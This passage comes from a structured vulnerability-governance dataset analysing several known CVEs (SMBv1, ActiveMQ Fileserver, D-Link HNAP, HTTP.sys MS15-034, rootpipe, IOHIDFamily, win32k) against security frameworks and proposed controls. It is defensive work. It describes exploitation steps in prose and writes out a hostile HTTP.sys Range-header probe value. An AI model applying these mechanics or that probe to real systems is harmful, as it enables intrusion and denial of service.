The Essential Eight is a patch-currency and hardening model whose hardening controls address user applications and macros; the protocol-level and internal-segmentation questions that decided the outcome of WannaCry and NotPetya fall outside all eight.

ISO-27001-2022-A.8.8.gap: Management of technical vulnerabilities requires vulnerability information to be obtained and exposure evaluated, and both ran correctly in March 2017 - MS17-010 was published, rated critical, and evaluated. The evaluation A.8.8 asks for is per-vulnerability and per-asset: is this host affected, is it patched. The question that decided the 2017 outcomes was neither of those. It was topological - can any host on this subnet reach TCP 445 on any other - and A.8.8 has no clause that turns a wormable pre-authentication finding into a network-reachability review. The control evaluated the exposure of each asset accurately and never asked what one compromised asset could reach.

ISO-27001-2022-A.8.22.gap: Segregation of networks is the control that would have bounded this rather than prevented it, and it is separate from the vulnerability-management cycle in a way that is exactly the problem. A.8.22 asks that networks be segregated according to trust levels, and it is assessed on its own schedule against a design rather than against current threat information. Nothing connects it to A.8.8: a critical wormable SMB finding arriving in March 2017 triggers a patch cycle and does not trigger a re-examination of whether TCP 445 is permitted between client subnets, which is the single decision that separated the organisations that lost a host from those that lost an estate.

new_control_requirements.name: CONFIGURATION-SIDE-LIVE-PATCH-INVENTORY
new_control_requirements.description: For any vulnerability with a configuration-side mitigation path, that path must be inventoried, tested and deployable independently of the vendor-patch path, so that operators are not dependent on a patch cycle to remove reachability.
new_control_requirements.evidence: Two configuration-side paths exist here and both outperform the patch. Disabling the SMBv1 server feature closes this defect and the other four in MS17-010 at once, without a reboot; blocking TCP 445 between client subnets bounds the propagation that made this CVE historically significant. The patch, by contrast, replaces a kernel-mode driver and does not take effect until the host restarts - which is precisely the window the 2017 worms ran through. The inventory requirement is not optional here either: SMBv1 can be re-enabled after patching by an application or a device requirement, and nothing in the patch record changes when it is.

new_control_requirements.name: CISA-KEV-RESPONSE-SLA
new_control_requirements.description: 4h KEV-listing mitigation SLA applies.
new_control_requirements.evidence: CISA added CVE-2017-0144 on 2022-02-10 with a 2022-08-10 due date - six months for a defect patched in March 2017 and used by two worms by June 2017. An hours-scale SLA is meaningful here because the deliverable action is not the patch: disabling SMBv1 and blocking 445 east-west are configuration pushes that need no reboot, whereas the kernel-driver fix needs a restart on every host and therefore a change window. Recording the mitigation inside hours and the reboot on its own dated schedule is the only way the SLA describes something real.

new_control_requirements.name: MITIGATION-ACTIVE-PATCH-PENDING-VERDICT-CLASS
new_control_requirements.description: Compliance verdicts must distinguish binary-patch-deployed from vendor-mitigation-active-without-patch from no-mitigation-at-all, and must surface the middle state as a time-bound compensating control rather than as a patched-per-SLA outcome.
new_control_requirements.evidence: This CVE produces four distinct states that a two-state record collapses into one: patched and rebooted; patched and awaiting reboot, where the kernel driver is still the old one; unpatched with SMBv1 disabled, which is not reachable through this path at all; and unpatched with SMBv1 enabled. Only the first is remediated and only the last is undefended, yet a patch-deployment inventory reports the first two identically and cannot see the third. Requiring the middle states to be recorded as time-bound compensating controls is what makes the difference between the second and the first visible before an incident rather than after.

CVE-2016-3088.name: Apache ActiveMQ Fileserver Improper Input Validation Vulnerability (CVE-2016-3088)

attack_vector.description: An unauthenticated HTTP PUT writes a file through the broker's Fileserver web application; an HTTP MOVE relocates it into the admin or api web application, where Jetty compiles and serves it as a JSP running as the ActiveMQ process user. The component is optional and, on a message broker, usually unwanted — Apache's remediation is simply to stop using it. Its presence is a default rather than a decision on 5.0.0 through 5.11.x, which is the population this CVE is really about.
attack_vector.privileges_required: none — PR:N and UI:N. Two unauthenticated HTTP requests to the broker's web port. Code runs as the ActiveMQ process user, on a host that sits between the applications whose messages it carries.
attack_vector.complexity: low — AC:L. Metasploit has automated the full PUT-then-MOVE chain since 2016 and the Nuclei template confirms exposure with a single benign write. The only variable is whether the Fileserver bean is present, and between 5.12.0 and 5.13.x that is a configuration question rather than a version one.
attack_vector.ai_factor: None. Found independently by Simon Zuckerbraun and Andrea Micalizzi (rgod) of Trend Micro ZDI and reported through coordinated disclosure.

prevention.what_would_have_worked: Upgrading to 5.14.0 or later, where Apache removed the Fileserver web application from the distribution; or, on a broker that cannot be upgraded, removing the Fileserver WebAppContext bean from conf/jetty.xml and restarting the broker.
prevention.adequacy: Both are complete for this CVE, which is unusual — the configuration change removes the vulnerable code path rather than blocking a route to it, because the flaw lives entirely inside the component being disabled. The upgrade is still the stronger choice for a different reason: at 5.14.0 the feature is gone from the distribution and cannot be restored by a later configuration edit, whereas the bean removal can be undone by anyone who edits jetty.xml.

detection.what_would_have_worked: Alerting on unauthenticated HTTP PUT and MOVE methods reaching the broker's web port, and file-integrity monitoring on webapps/admin/ and webapps/api/ for .jsp files that are not part of the distribution.
detection.adequacy: The method-level alert is precise, because PUT and MOVE have no legitimate role in ActiveMQ's admin console traffic — this is one of the cleaner request-shape signatures available. File-integrity monitoring on the webapp directories is the backstop that catches a hit whose request logs have rolled over. Neither answers the prior question of whether the Fileserver bean is present at all, which is a configuration read rather than a detection.

response.what_would_have_worked: Treating a hit as code execution in the message path: remove attacker-written JSPs from the webapp directories, rebuild the broker from a known-good 5.14.0+ installation rather than deleting files in place, and rotate the credentials the broker held — the connection credentials for every producer and consumer attached to it.
response.adequacy: The credential scope is the part that is routinely underestimated: a broker sits between systems by definition, so its configuration holds the connection details of everything attached to it, and the message store holds content in transit. Rebuilding rather than cleaning is correct because the write primitive reached arbitrary filesystem paths, not only the webapp directories. The expensive part is the reconnection of every attached producer and consumer, not the broker rebuild itself.

NIST-800-53-CM-7.gap: The Fileserver is a WebAppContext bean inside conf/jetty.xml sharing the broker's web listener and port with the admin console. A CM-7 enumeration of services and ports sees one ActiveMQ web listener and cannot separate the component Apache says to stop using from the one the operator needs.

AU-Essential-8-Patch.gap: A public exploit has existed since 2016, so the 48-hour tier applies, but a version-fingerprinting scanner reports 5.12.x and 5.13.x as not vulnerable because the mapping records Apache's default rather than the deployed jetty.xml. Confirming exposure requires the active PUT-then-GET write that the Nuclei template performs and that most authenticated scan policies exclude.

ISO-27001-2022-A.8.9.gap: A.8.9 monitors configuration against an established baseline, and on 5.0.0 through 5.11.x the shipped configuration is the vulnerable state. A conformant configuration-management process therefore monitors for drift away from a baseline that already has the Fileserver enabled, and reports no finding.

new_control_requirements.name: CISA-KEV-RESPONSE-SLA
new_control_requirements.description: For any CVE listed in CISA KEV: deploy verified mitigation (patch, live patch, or documented compensating controls) within 4 hours of KEV listing or patch availability, whichever is later.
new_control_requirements.evidence: Apache removed the feature in 5.14.0 in 2016 and CISA listed the CVE on 2022-02-10 with a due date of 2022-08-10; EPSS still reads 0.98518 at the 99.917th percentile on 2026-08-28, with a Metasploit module and a maintained Nuclei template both carrying the id. The 'documented compensating controls' branch is what makes the 4-hour window achievable on a broker that cannot take an upgrade in that time: Apache's own instruction — remove the Fileserver WebAppContext bean from conf/jetty.xml — is a same-day change that eliminates the vulnerable code path. 'Verified' cannot mean the reported broker version, because 5.12.x and 5.13.x are decided by the file rather than the version.

new_control_requirements.name: MITIGATION-ACTIVE-PATCH-PENDING-VERDICT-CLASS
new_control_requirements.description: Compliance verdicts must distinguish three states: (a) binary patch deployed, so the vulnerability is eliminated; (b) a vendor-mitigation rule is active with no binary patch, leaving the residual risk that any defect or gap in the mitigation reopens the flaw; (c) neither.
new_control_requirements.evidence: This CVE has three genuinely distinct states that a version check collapses into two. State (a) is 5.14.0 or later, where Apache removed the Fileserver from the distribution and no configuration edit can bring it back. State (b) is a 5.0.0-to-5.13.x broker with the WebAppContext bean removed from conf/jetty.xml — not exploitable, and reverted by anyone who edits that file. State (c) includes 5.12.x and 5.13.x brokers where the bean was re-enabled, which read as safe to a scanner keyed on Apache's post-5.12.0 default. Recording which state a broker is in is the only way the reversion from (b) to (c) is ever visible, and it is the difference between a mitigation that holds and one that a routine configuration change silently undoes.

CVE-2015-2051.name: D-Link DIR-645 HNAP SOAPAction Header Command Injection

attack_vector.description: An unauthenticated HTTP request to /HNAP1/ carries a SOAPAction header naming the GetDeviceSettings action with a shell metacharacter and a command appended. The HNAP handler passes the action string to a command interpreter without neutralising it, so the command runs on the router with the web server's privileges. The public implementation is blind - no command output is returned - so the attacker works from side effects.
attack_vector.privileges_required: none - the vulnerable action is reachable before any authentication check, which is why the public module is named noauth
attack_vector.complexity: low - one request, no session and nothing to groom; EPSS sits at 0.97101 (99.888th percentile) on 2026-08-28
attack_vector.ai_factor: Not AI-discovered and not AI-weaponised. The 2015 disclosure and the botnet tooling that uses it are hand-written.

prevention.what_would_have_worked: Remove the device. D-Link's SAP10282 advises retirement, records end-of-support on 2018-12-31 and offers no firmware fix, and CISA's KEV required action is disconnection. Until removal, block WAN reachability of /HNAP1/ and the management surface and segment the device.
prevention.framework_requiring_it: CISA BOD 22-01 (KEV remediation, added 2022-02-10, due 2022-08-10, required action: disconnect)
prevention.adequacy: Removal is decisive; every other measure is partial. Blocking the WAN path does not close the adjacent-network path the CVSS vector describes, so any host already on the LAN - including a compromised client - still reaches the endpoint.

detection.what_would_have_worked: Alert on inbound /HNAP1/ requests on the WAN interface and on SOAPAction headers containing shell metacharacters, using the vendor IPS signature class where an IPS is in path.
detection.adequacy: Effective only where something inspects traffic in front of the gateway, which on a small-office deployment is usually nothing - the router is the perimeter. The realistic detection surface is the device's own outbound behaviour observed from the network it faces, not the inbound exploit request.

response.what_would_have_worked: Replace the hardware rather than reflashing it, and treat the network behind it as having had an untrusted gateway: rotate credentials used over that network, and check clients for the consequences of hostile DNS or traffic interception.
response.adequacy: Correct in direction and hard to bound in scope. Root on the gateway means every unencrypted or badly-validated session that crossed it is suspect, and the device retains no forensic record worth recovering, so the response has to be scoped from what the network carried rather than from evidence on the box.

NIST-800-53-SI-2.gap: Flaw remediation requires flaws to be identified, reported and corrected. On this CVE there is nothing to correct with: D-Link's SAP10282 records end-of-support on 2018-12-31 and states that firmware development ceases for retired products, so the SI-2 process has no vendor artefact to install. An SI-2 implementation whose scanner reports the device as having no available update will read that as a clean result, which is the exact inversion of the truth - the absence of an update here means permanent exposure rather than nothing to do, and the corrective action SI-2 needs to record is a replacement date.

NIST-800-53-SC-7.gap: Boundary protection is the only control on this list that can actually contain the flaw, and it is the one the device defeats by being the boundary. The DIR-645 is the gateway, so an SC-7 architecture that places filtering at the perimeter places it on the compromised component: after command execution as root the attacker controls the routing and DNS the boundary depends on. The residual SC-7 action - denying WAN reachability of /HNAP1/ - has to be taken upstream of the device or on the device itself, and the CVSS vector's AV:A path leaves every LAN-side host able to reach the same endpoint regardless.

EU-CRA-Art13.gap: The Cyber Resilience Act places obligations on manufacturers to handle vulnerabilities and supply security updates across a defined support period, which is the obligation whose absence this CVE demonstrates. It does not reach this product: the CRA's requirements apply to products with digital elements placed on the market after its application date, and the DIR-645 was placed on the market more than a decade earlier and reached end-of-support on 2018-12-31. So the regulation that would have compelled a fix is, for this device, correctly out of scope - which leaves the operator with removal as the only instrument.

NIS2-Art21-network-security.gap: Art. 21 requires measures for network and information system security including network segmentation. Segmentation is the right instrument here and it is explicitly a holding measure rather than a remediation: it bounds what a compromised gateway can reach but leaves the gateway compromised, still resolving DNS and routing traffic for its clients. Art. 21 offers no obligation that terminates the exposure, because terminating it means replacing hardware the vendor no longer supports - a procurement decision the article does not reach.

UK-CAF-B4.gap: The system security outcome expects services to be configured and maintained to resist attack. Maintenance is unavailable here by the vendor's own statement, so B4 cannot be met on this device by any action short of removing it. That is the useful reading of the gap: an assessment that records the router as configured according to guidance and firmware-current is describing a device that D-Link lists as affected at every firmware version, and the outcome fails regardless of how the configuration is scored.

AU-Essential-8-Patch.gap: The Essential Eight patch-applications and patch-operating-systems controls both require that unsupported products be replaced, and by that measure this device is a straightforward failure independent of the CVE - it has been unsupported since 2018-12-31. The gap is one of scope rather than of stringency: the Essential Eight is written around workstations, servers and named application classes, and a small-office gateway that no software inventory agent can be installed on is unlikely to appear in the population an assessment enumerates at all.

ISO-27001-2022-A.8.8.gap: Management of technical vulnerabilities requires vulnerability information to be obtained and acted on. Acting on this one means disposing of an asset, which A.8.8 does not model - its remediation vocabulary is patching and configuration change, and both are unavailable. An A.8.8 register that carries this CVE with 'no vendor fix available' as its disposition is accurate and inert; the finding it should produce is that the asset itself must leave the estate, which belongs to a different control than the one holding the CVE.

new_control_requirements.name: UNSUPPORTED-NETWORK-DEVICE-ENUMERATION-AND-RETIREMENT
new_control_requirements.description: Every network-attached embedded device - routers, IP cameras, NVRs, print and scan appliances - must carry an end-of-support date in the asset inventory, and any device past that date that exposes a remotely reachable management or media surface must be removed from untrusted networks and scheduled for replacement, because patching is not an option once the vendor retires the model.
new_control_requirements.evidence: D-Link's SAP10282 supplies the exact data this control requires and shows what happens without it: the DIR-645's end-of-support date is 2018-12-31, the announcement lists all hardware revisions and all firmware versions as affected, and it states that firmware development ceases for retired products. An inventory carrying that date turns this CVE into a replacement item; one that carries only a firmware version turns it into a patch item with no patch, and the 2015 firmware 1.05b01 from SAP10051 is precisely the artefact that makes the second reading look defensible. The distinguishing test: query the inventory for devices past end-of-support whose management interface is reachable from an untrusted segment, and treat any result without a replace-or-formally-risk-accept decision as a finding.

new_control_requirements.name: EOL-ASSET-DECOMMISSION
new_control_requirements.description: Network-reachable end-of-life assets with no vendor patch path must be isolated and decommissioned within a bounded window; mandatory compensating segmentation applies until removal, since no remediation exists.
new_control_requirements.evidence: CISA's required action on this CVE is not 'apply updates per vendor instructions' but 'The impacted product is end-of-life and should be disconnected if still in use' - the catalogue itself declares the terminal state. The compensating segmentation the control requires has a specific shape on a gateway: because the device is the boundary, the segmentation has to be imposed upstream of it and the device's WAN-side /HNAP1/ reachability removed, since filtering placed on the device is filtering placed on the component the attacker owns. The bounded window is the part that is usually missing - CISA set 2022-08-10, and a device still in service after that date is running with no remediation of any kind.

new_control_requirements.name: CISA-KEV-RESPONSE-SLA
new_control_requirements.description: For any CVE listed in CISA KEV: deploy verified mitigation (patch, live patch, or documented compensating controls) within 4 hours of KEV listing or patch availability, whichever is later.
new_control_requirements.evidence: CISA listed this on 2022-02-10 with a 2022-08-10 due date - six months for an unauthenticated command injection with a verified public exploit module since 2015-06-01 and an EPSS of 0.97101 at the 99.888th percentile on 2026-08-28, actively used by the EnemyBot family Fortinet documented two months into that window. Because no patch exists, the four-hour clock resolves entirely to the documented compensating control: cut WAN reachability of the device's management surface and /HNAP1/ immediately, then schedule the physical replacement the vendor and CISA both call for.

CVE-2015-1635.name: Microsoft HTTP.sys Range Header Integer Overflow (MS15-034)

attack_vector.description: An unauthenticated HTTP request with a Range header at the 64-bit boundary drives HTTP.sys's range arithmetic out of bounds. The listener is kernel-mode and fronts every HTTP Server API consumer on the host, not only IIS, so a single request reaches the defect and Microsoft rates the outcome as code execution in the System account context.
attack_vector.privileges_required: none (unauthenticated HTTP request to any HTTP.sys-fronted port)
attack_vector.complexity: low to trigger - one header value, public since 2015-04-15; materially harder to weaponise for code execution, with only scanners, a DoS module and a memory-dump module public
attack_vector.ai_factor: Not AI-discovered. MS15-034 records coordinated disclosure and names no reporter; 2015 predates the AI-assisted discovery programmes this catalog tracks.

prevention.what_would_have_worked: Apply KB 3042553 and reboot on every Windows 7 SP1, Server 2008 R2 SP1, Windows 8, 8.1, Server 2012 and Server 2012 R2 host that binds an HTTP.sys listener - IIS or otherwise.
prevention.adequacy: Sufficient once the reboot completes; an installed-but-not-rebooted host keeps the vulnerable driver loaded and stays fully exposed.

detection.what_would_have_worked: Alert on Range headers at the 64-bit boundary at the edge, and on HTTP.sys bugchecks or unexplained loss of all HTTP listeners.
detection.adequacy: Cheap and reliable for the probe, which is the same request the public tooling sends; it does not distinguish scanning from exploitation.

response.what_would_have_worked: Confirm remediation by sending the range probe rather than by reading the patch record, and enumerate non-IIS HTTP.sys listeners that the IIS-only workaround never covered.
response.adequacy: The only check that distinguishes patched from patched-and-not-rebooted, which is the state this CVE produces most often.

NIST-800-53-SI-2.gap: Flaw remediation that records KB 3042553 as installed is not recording that the fix is active. MS15-034 replaces the kernel-mode HTTP.sys driver, so the vulnerable code stays resident until the host reboots - an SI-2 process measuring patch deployment rather than post-reboot driver state reports remediation on a host that still answers the range request.

NIS2-Art21-network-security.gap: Network security cannot remove the exposure, because the listening port is the service. HTTP.sys fronts whatever the host is published for, and the request that reaches the vulnerable parser is a well-formed HTTP request to that port with a hostile Range header - no segmentation, filtering or reverse-proxy placement changes that unless the intermediary itself normalises Range, which the control does not require and most deployments do not do.

UK-CAF-B4.gap: Secure system configuration takes the vendor workaround as evidence of a managed risk. MS15-034 names exactly one workaround, disabling IIS kernel caching, and qualifies it in the bulletin's own words as 'specific to IIS' with a performance cost - so on a host where HTTP.sys serves a non-IIS listener there is no configuration-side option at all, and a record showing 'vendor workaround applied' overstates the coverage for every such host.

AU-Essential-8-Patch.gap: The Essential Eight measures patch application from availability, and the gap this CVE shows is the reboot. The maturity criteria are satisfied by deploying the update within the required window, while a Windows server deferred through several maintenance cycles carries an installed-but-not-loaded fix - the estate looks patched in the management console and answers the public PoC's Range probe on the wire.

ISO-27001-2022-A.8.8.gap: Management of technical vulnerabilities requires knowing which assets carry the component. HTTP.sys is not an installed product an inventory lists; it is a kernel driver that any application binding the HTTP Server API brings into scope, so an inventory built around 'which hosts run IIS' understates the affected estate by every service that publishes HTTP through Windows without IIS in front of it.

new_control_requirements.name: CONFIGURATION-SIDE-LIVE-PATCH-INVENTORY
new_control_requirements.description: For any web-fabric vulnerability with a configuration-side mitigation path: that path must be inventoried, tested, and deployable independent of the vendor-patch path.
new_control_requirements.evidence: MS15-034 names one configuration-side path and bounds it in the bulletin's own words: 'Disable IIS kernel caching. This workaround is specific to IIS and can cause performance issues.' For this CVE the control therefore means two things an operator must know before the disclosure rather than during it - how kernel caching is disabled and what throughput that costs on each published site, and which HTTP.sys listeners on the estate are not IIS at all, since those have no configuration-side option and must go straight to KB 3042553 and a reboot. Precondition: the workaround does not remove the defect, so it carries a dated action item to reach the patched-and-rebooted state.

new_control_requirements.name: MITIGATION-ACTIVE-PATCH-PENDING-VERDICT-CLASS
new_control_requirements.description: Compliance verdicts must distinguish binary-patch-deployed from vendor-mitigation-active-without-patch from no-mitigation-at-all, and must surface the middle state as a time-bound compensating control rather than as a patched-per-SLA outcome.
new_control_requirements.evidence: This CVE produces a fourth state the three do not name, and it is the common one: KB 3042553 installed but the host not yet rebooted, so the vulnerable HTTP.sys driver is still the loaded one. A record that reads 'patched' on install is asserting something the wire contradicts. The distinguishing test is a request, not a version string - send 'Range: bytes=0-18446744073709551615' and confirm the host no longer returns the range-not-satisfiable response that Exploit-DB 36773 and the public nuclei template both key on. The genuine middle state here is the IIS kernel-caching workaround, which the bulletin scopes to IIS only, so it must be recorded with the set of non-IIS listeners it does not cover.

new_control_requirements.name: CISA-KEV-RESPONSE-SLA
new_control_requirements.description: 4h KEV-listing mitigation SLA applies.
new_control_requirements.evidence: CISA listed CVE-2015-1635 on 2022-02-10 with a 2022-08-10 due date, six months rather than the usual fortnight, for a defect whose public trigger had been a single header value since 2015-04-15. EPSS on 2026-08-28 was 0.99999 at the 99.998th percentile, the highest in this chunk. What an hours-scale SLA delivers is the wire test across the estate - probe every HTTP.sys-fronted listener with the boundary Range value - because that identifies both unpatched hosts and the installed-but-not-rebooted ones a patch report cannot separate.

CVE-2015-1130.name: Apple OS X Admin Framework XPC Authentication Bypass (CVE-2015-1130)

attack_vector.description: The Admin framework's writeconfig XPC service runs as root and exposes createFileWithContents:path:attributes: to any caller that can reach its remoteProxy. Writing a file as root with NSFilePosixPermissions 04777 produces a setuid-root binary and escalation follows. Passing nil to authenticateUsingAuthorizationSync sends the authorization callbacks to nil, which in Objective-C succeeds silently.
attack_vector.privileges_required: low — any local account. The first published exploit needed an admin account, which OS X creates by default at installation; the nil-authorization refinement removed even that requirement.
attack_vector.complexity: low — no memory corruption, no race, no timing. A short Objective-C program calling documented framework methods in order, needing only class and method names adjusted between the 10.7/10.8 and 10.9-and-later lines.
attack_vector.ai_factor: None. Found by Emil Kvarnhammar of TrueSec on 2014-10-02 through Hopper disassembly, after noticing that the 10.8.5 fix for CVE-2013-1775 had also made systemsetup require root.

prevention.what_would_have_worked: OS X Yosemite v10.10.3 with Security Update 2015-004, and beyond it a later Yosemite update given the reported bypass. For 10.9 and earlier, an OS upgrade or retirement of the host — there was no other option.
prevention.adequacy: Adequate only on the Yosemite line, and not durably even there: Patrick Wardle of Synack demonstrated the 10.10.3 fix could be bypassed. On 10.7 through 10.9 the vendor declined to back-port, so prevention was never available to that population at all.

detection.what_would_have_worked: File-integrity monitoring for setuid-root files appearing outside package installation, and endpoint telemetry on XPC calls to the Admin framework's writeconfig service.
detection.adequacy: Weak for the period. The exploit generates no authentication event and no crash — it calls documented APIs successfully — so the only durable artefact is the setuid file it writes, and macOS endpoint telemetry of the kind that would see the XPC call was not generally deployed in 2015.

response.what_would_have_worked: Treating a hit as root compromise of the host: rebuild, and rotate any credential or key the machine held, since a root-capable process could have read the login keychain and any developer signing material.
response.adequacy: Correct, and its cost is why the unpatched population matters. On a 10.9-or-earlier host there is no state to return to that is not still exploitable, so response has no endpoint short of replacing the operating system.

NIST-800-53-AC-6.gap: The obvious least-privilege mitigation — demote users from admin to standard — was defeated before disclosure. Kvarnhammar's nil-authorization variant means the exploit 'is no longer limited to admin accounts only', so an estate that invested in standard-user builds is exactly as exploitable as one that shipped everyone as admin, and the service on the other side of the XPC channel runs as root regardless.

NIS2-Art21-patch-management.gap: There is nothing to manage for most of the affected estate: Apple published a fix for the Yosemite line only and stated it would not back-port to 10.9.x and older. The measure records an unclosed item where the honest finding is an unsupported operating system requiring migration, and the reported bypass of the 10.10.3 fix means even the patched line was not settled by deployment.

UK-CAF-B2.gap: Apple's own description of the defect is 'an issue existed when checking XPC entitlements' — the identity check on the privileged interface is the thing that was absent. An estate can hold accurate, well-governed account and elevation policy while any local process writes a setuid-root binary through a framework API that never consults it.

AU-Essential-8-Patch.gap: Patch operating systems has no state for a vendor declining to remediate a line. For 10.7, 10.8 and 10.9 the strategy scores a patching failure where the accurate finding is that no patch exists and the host must leave service.

ISO-27001-2022-A.5.15.gap: Access-control policy governs accounts and approvals, and the elevation path here is a framework method. Nothing in a privileged-access review would surface createFileWithContents on a root XPC service, because it had been present since 10.7 and was never classified as a privilege interface by anyone until 2014.

new_control_requirements.name: EOL-ASSET-DECOMMISSION
new_control_requirements.description: Hosts running an operating system version with no vendor patch path must be isolated and decommissioned within a bounded window; mandatory compensating segmentation applies until removal.
new_control_requirements.evidence: Apple's advisory scopes the Admin framework fix to 'OS X Yosemite v10.10 to v10.10.2', and Kvarnhammar records Apple stating it would not back-port because the change was substantial. That leaves 10.7, 10.8 and 10.9 permanently exploitable by a published, Metasploit-packaged local root exploit, with no configuration mitigation available since writeconfig is what System Preferences uses. CISA's 2022 KEV listing of a 2015 CVE is the measure of how long those hosts stayed in service.

new_control_requirements.name: KERNEL-EXPLOITATION-DETECTION
new_control_requirements.description: Deploy host audit or eBPF-equivalent monitoring rules for privilege-escalation indicators, alerting within 60 seconds of detection. On macOS this means the endpoint-security equivalents rather than kernel-exploit indicators, because the escalation here runs through a userspace root daemon.
new_control_requirements.evidence: This is the closest existing control and it needs restating for the platform: nothing about this exploit is a kernel event. The observable is a non-root process calling the Admin framework's writeconfig service through WriteConfigClient and remoteProxy, followed by a setuid-root file with mode 4777 appearing outside any package installation — the exact artefact Kvarnhammar's demonstration produced as rootpipe.tmp. There is no authentication failure, no crash and no network activity to correlate against.

new_control_requirements.name: CISA-KEV-RESPONSE-SLA
new_control_requirements.description: For any CVE listed in CISA KEV: deploy verified mitigation (patch, live patch, or documented compensating controls) within 4 hours of KEV listing or patch availability, whichever is later.
new_control_requirements.evidence: Verified is the load-bearing word twice over here. The verification target is the OS build rather than the account model, because demoting users to standard does not mitigate the nil-authorization variant. And the vendor's own remediation is not a terminal state: Patrick Wardle of Synack demonstrated that the 10.10.3 fix could be bypassed, so an attestation recorded against 10.10.3 needs re-verifying against a later Yosemite update rather than closing.

CVE-2014-4404.name: Apple OS X Heap-Based Buffer Overflow Vulnerability

attack_vector.description: A local application supplies crafted key-mapping properties to IOHIDFamily; IOHIKeyboardMapper::parseKeyMapping copies past the end of a heap allocation and corrupts adjacent kernel memory. Paired with an IORegistry pointer leak for a kASLR bypass, the corruption yields code execution in a privileged context. Apple's fix is improved bounds checking.
attack_vector.privileges_required: none in the CVSS sense — PR:N with UI:R; what the attacker needs is not credentials but code already running on the device, which on these platforms means an application the user has run.
attack_vector.complexity: low — AC:L. The paired pointer leak removes the probabilistic element, so on an unpatched build the escalation is deterministic once the foothold exists.
attack_vector.ai_factor: Found by manual reverse engineering by Ian Beer of Google Project Zero, credited by Apple in the advisory and by the public module. No automated or AI-assisted discovery is claimed.

prevention.what_would_have_worked: Reaching a fixed operating-system version and restarting: OS X 10.10 or Security Update 2015-004 on 10.8.5 and 10.9.5, iOS 8, Apple TV 7. There is no configuration workaround because the vulnerable path is an ordinary IOKit property.
prevention.adequacy: Complete where a fixed version can be reached. Where it cannot — hardware that never received Yosemite, iOS devices that never received 8, first- and second-generation Apple TV — there is no remediation at all and the only disposition is removal.

detection.what_would_have_worked: Endpoint telemetry on applications touching IOHIDFamily key-mapping properties through IOKit, and kernel-panic reporting from hosts below 10.10 where a failed overflow leaves a crash.
detection.adequacy: This is weak on exactly the platforms in scope: iOS and Apple TV offer no such telemetry to an operator, and the OS X versions affected predate the endpoint tooling that would collect it, so detection is realistic only on managed Macs and only for the OS X half.

response.what_would_have_worked: Treating a confirmed escalation as a full device compromise rather than an application incident: the outcome is kernel-level code execution, so nothing running on the device after it can be trusted, and the device is rebuilt rather than cleaned.
response.adequacy: Rebuild is the correct disposition and the achievable one on OS X. On an unsupported iOS or Apple TV device it restores the same vulnerable version, so response returns the device to the state that permitted the compromise.

NIST-800-53-SC-39.gap: The control is satisfied by the operating system providing separate execution domains, and this defect is a bug in the mechanism that provides them. Nothing in an SC-39 assessment can distinguish a kernel that isolates processes correctly from one whose HID driver will copy past a heap allocation on request, so the control is recorded as met on the host where the isolation fails.

EU-CRA-Art13.gap: The regulation's manufacturer obligations attach to products placed on the market under it and run for a defined support period. These releases predate that by around a decade, so the instrument produces no obligation on the manufacturer and no artefact for the operator. The population still exposed is outside the regulation's reach entirely rather than inadequately served by it.

UK-CAF-B4.gap: There is no configuration item to assess, since the vulnerable path is an IOKit property any application may set and Apple published no workaround. The outcome can be achieved on devices where a local application will take the kernel, because the only variable that changes the answer is the OS version and B4 does not turn on that.

AU-Essential-8-Patch.gap: Grading patch cadence against the vendor's current release produces no signal for a device with no current release. The affected devices fall outside the strategy's measurement rather than failing it, so an estate can score well on operating-system patching while carrying devices that cannot be patched at all.

ISO-27001-2022-A.8.8.gap: The measure the control anticipates does not exist for an unsupported device, and the control offers no alternative disposition. Its evaluation is also miscalibrated by the CVE's AV:L shape, which reads as a low-priority local issue rather than as the escalation half of a chain with verified public exploit code available since 2014-12-02.

new_control_requirements.name: CISA-KEV-RESPONSE-SLA
new_control_requirements.description: For any CVE listed in CISA KEV: deploy verified mitigation (patch, live patch, or documented compensating controls) within 4 hours of KEV listing or patch availability, whichever is later.
new_control_requirements.evidence: CISA listed the CVE on 2022-02-10 with a six-month due date of 2022-08-10, roughly seven years after Apple's fixes. For devices that can reach a fixed version the obligation is the update and a restart; for those that cannot, the clause accepting documented compensating controls is the only one that applies, and the compensating control has to be isolation rather than configuration, because Apple published no workaround. That distinction is the one the patch-cadence strategy cannot express.

new_control_requirements.name: EOL-ASSET-DECOMMISSION
new_control_requirements.description: Network-reachable end-of-life devices and software with no vendor patch path must be isolated and decommissioned within a bounded window; mandatory compensating segmentation applies until removal since no remediation exists.
new_control_requirements.evidence: Every affected release — OS X below 10.10, iOS before 8, Apple TV software before 7 — is past Apple's support, and hardware that never received a fixed version has no patch path at all. The vulnerability-management control has no disposition for that state, the system-security outcome has no configuration item to examine, the CRA's manufacturer obligations do not reach products of this vintage, and the isolation primitive the process-isolation control relies on is the thing that is broken. A bounded decommission window with segmentation until removal is the only requirement that resolves all four.

new_control_requirements.name: MOBILE-ENDPOINT-MDM-ENFORCED-KEV-SLA
new_control_requirements.description: DDM-enforced 24h KEV update on iOS/macOS estates.
new_control_requirements.evidence: On the iOS and Apple TV side of this CVE the operator has no endpoint telemetry and no configuration lever, so the only enforceable action is pushing the fixed OS version and confirming the restart. Where users choose when to update, a device can sit below iOS 8 or Apple TV 7 indefinitely, and the process-isolation guarantee the security architecture assumes is void for the whole of that period. Management-enforced version compliance is what turns 'a fixed version exists' into 'this device is on it'.

attack_vector.description: During the user-mode callback in xxxClientAllocWindowClassExtraBytes, the exploit calls NtUserConsoleControl to mark the window as a console window, setting 0x800 in tagWND.dwExtraFlag so the kernel reads tagWND.pExtraBytes as a desktop-heap offset instead of a user-mode pointer. The CVE-2021-1732 fix had permitted SetWindowLong to write kernel memory for console windows only, so the conversion turns that exception into an out-of-bounds desktop-heap write. A fake spmenu in an adjacent window read back through GetMenuBarInfo supplies the read primitive, and the pair is used to copy the SYSTEM token onto the exploiting process.
attack_vector.privileges_required: PR:L — code execution as any interactive user. That is the whole gate; there is no second condition, no race and no leak dependency.
attack_vector.complexity: low — AC:L and data-only. Public exploits including a Metasploit module appeared within weeks of the 2022-01-11 fix, targeting Windows 10 v1803 through 21H2 x64, so exploitation is running a binary rather than developing one.
attack_vector.ai_factor: None. No AI tooling is credited by Microsoft, by Unit 42 or by Google Project Zero, and the public exploits are hand-written win32k code building on the CVE-2021-1732 technique.

prevention.what_would_have_worked: Applying the January 2022 (2022-01-11) Windows cumulative update and restarting. There is no workaround and no configuration change to fall back on, so the only other lever is denying the precondition: stopping untrusted code from executing in interactive sessions at all.
